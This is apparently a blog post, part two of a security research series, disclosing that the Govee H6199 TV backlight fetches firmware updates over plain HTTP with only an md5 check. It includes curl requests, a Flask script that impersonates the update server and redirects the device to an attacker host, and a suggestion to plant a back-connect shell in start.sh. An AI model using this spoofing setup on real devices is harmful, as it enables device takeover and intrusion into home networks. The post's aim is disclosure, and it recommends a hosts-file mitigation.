---
# Feel free to add content and custom Front Matter to this file.
# To modify the layout, see https://jekyllrb.com/docs/themes/#overriding-theme-defaults

layout: default
toc: true
---
# Govee Immersion WiFi LED TV (H6199) - Part 2: Updates Done Wrong

<script type="text/javascript">toc()</script>

In <script type="text/javascript"> document.write("Part 1".link(window.location.origin + "/h6199/1/govee_h6199.html")); </script> we have seen how to get root access to the H6199. We can use the default password to access the system remotely, but an potential attacker needs to be able to connect to the device. This usually means an attacker needs to have access to your local network. This is bad enough already, right?! This part will look at the update process... 

## High-Level Update Process
Lets first get an impression on how the update process is designed:
<center><img src="draw.io/update_process.drawio.png" style="width:70%; max-width:1000px;" alt="Main Pic" /></center>

1. The H6199 contacts app.govee.com and sends its current software version. Please note this is not the version shown in the app. They call this version the `wifiVersionSoft` while the version shown in the app is called `bleVersionSoft`. My device has currently runs on `wifiVersionSoft` `1.00.26`.
2. The server at app.govee.com checks if a newer software version is available. If so, it returns the location where it can be downloaded.
3. The H6199 request the software at the location returned by app.govee.com.
4. The H6199 receives the software and waits until the LEDs are turned off. Then the update is installed automatically.

This whole process is triggered automatically several times a day and upon boot. This means it doesn't require any user interaction.

## Lets look at the communication
By looking at the binary `/home/govee/app` using Ghidra, I figured that the H6199 uses the endpoint `http://app.govee.com/device/rest/devices/v1/wifiCheckVersion` to check for new software Versions. This endpoint expects a JSON containing the current hard- and software version as well as the type of the device:
```text
{"sku": "H6199", "wifiVersionHard": "1.00.01", "wifiVersionSoft": "1.00.26"}
```
You can manually send such JSONs to that endpoint, e.g. using curl:

```text
$ curl -X POST -H "Content-Type: application/json" \                            
    -d '{"sku": "H6199", "wifiVersionHard": "1.00.01", "wifiVersionSoft": "1.00.26"}' \
    http://app.govee.com/device/rest/devices/v1/wifiCheckVersion
```
this returns:
```text
{"checkVersion":{"sku":"","versionHard":"","versionSoft":"","needUpdate":false,"downloadUrl":"","md5":"","size":0,"time":27773169},"message":"success","status":200}
```
`needUpdate":false` indicates that there are no new updates. But if we decrease the software version a bit we can actually get an update response:
```text
$ curl -X POST -H "Content-Type: application/json" \                            
    -d '{"sku": "H6199", "wifiVersionHard": "1.00.01", "wifiVersionSoft": "1.00.25"}' \
    http://app.govee.com/device/rest/devices/v1/wifiCheckVersion
```
```text
{"checkVersion":{"sku":"H6199","versionHard":"1.00.01","versionSoft":"1.00.26","needUpdate":true,"downloadUrl":"http://s3.amazonaws.com/govee-public/upgrade-pack/b19eb79f801bb113eba17521b88fc157-H6199_WIFI_HW1.00.01_SW1.00.26_OTA.tgz","md5":"801bb113eba17521","size":3072352,"time":27773172},"message":"success","status":200}
```

If the H6199 gets this response it uses the provided link, downloads the software, checks that the md5 sum matches and installs the update once the LEDs are turned off.

## HTTP only...
I'm a bit puzzled about why the `wifiCheckVersion` endpoint is not contacted using https. This way, an attacker (even outside of your local network) is able to modify the response. In particular an attacker that is controls the nameserver can easily map app.govee.com to a server under his control and send his own responses. That wouldn't be such an issue if the device would enforce https on the download link and check the certificates there. But that is not what is happening. One can for instance redirect the request to app.govee.com to any other address by adding a `/etc/hosts` to the H6199 and use a simple python script to respond to requests:
```python
from flask import Flask, jsonify, request

app = Flask(__name__)

@app.route('/device/rest/devices/v1/wifiCheckVersion', methods=['POST'])
def post_incode():
    return '{"checkVersion":{"sku":"H6199","versionHard":"1.00.01","versionSoft":"1.00.26","needUpdate":true,"downloadUrl":"http://<SOME IP ADDRESS>:8080/b19eb79f801bb113eba17521b88fc157-H6199_WIFI_HW1.00.01_SW1.00.26_OTA.tgz","md5":"5851ed92d2e6c77180ae23087957493b","size":3072053,"time":27764597},"message":"success","status":200}', 200

if __name__ == "__main__":
    from waitress import serve
    serve(app, host="0.0.0.0", port=80)
```

This tells the device a new update is available and points to a http server under the attackers control. The device will download and install the update. Since there is no signature on the update package, an attacker can simply modify the contained `start.sh` script in the update package and update the md5 value in the response. An attacker could for instance add a back-connect shell to that script to get access to your local network from the outside.

## Conclusion and Recommendation

This is pretty bad actually. It means, anyone that can somehow tamper the DNS request or http answer of app.govee.com can force the device to update with his modified software. Eventually, this could enable an attacker to access your local network.

Clearly, this is bad and I fear I need to recommend to disable the updates. This can easily be achieved by creating a `/etc/hosts` on the H6199 that maps app.govee.com to localhost:
```text
127.0.0.1 app.govee.com
```
This forces the update procedure to fail, while the device can still be controlled via the app. Not nice I know. But as long as there is no proper fix for the update procedure, not disabling it leaves the risk that someone breaks into your network. If there ever is an update it should probably be downloaded manually, inspected before installation and be installed using a python script like the one above.
